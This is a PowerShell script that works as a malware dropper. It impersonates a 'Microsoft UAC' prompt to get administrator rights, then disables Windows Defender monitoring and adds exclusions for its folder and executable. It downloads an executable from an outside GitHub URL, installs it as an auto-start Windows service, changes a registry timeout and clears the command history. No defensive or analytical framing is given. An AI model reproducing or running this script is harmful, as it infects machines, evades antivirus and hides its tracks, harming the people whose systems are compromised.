Add-Type -AssemblyName "System.Windows.Forms"
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)

if (-NOT $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    [System.Windows.Forms.MessageBox]::Show("We highly recommend you run this application as administrator, please exit and run as administrator.", "Microsoft UAC", [System.Windows.Forms.MessageBoxButtons]::OK)
    exit
} else { Write-Host "Continuing...."; Start-Sleep -Milliseconds 4768}
Start-Sleep -Milliseconds 3232
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
$path="C:\ProgramData\orkide\"
mkdir $path
$fullpath = Join-Path -Path $path -ChildPath "mspsrv.exe"
Set-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;Set-MpPreference -ExclusionProcess $fullpath -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue;Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "https://github.com/esquery/eq/raw/refs/heads/main/mspsrv.exe" -OutFile $fullpath
Start-Sleep -Seconds 1
sc.exe create MasterService binPath= "C:\ProgramData\orkide\mspsrv.exe" start= auto
reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v ServicesPipeTimeout /t REG_DWORD /d 70000
Start-Sleep -Seconds 1
Clear-History
exit






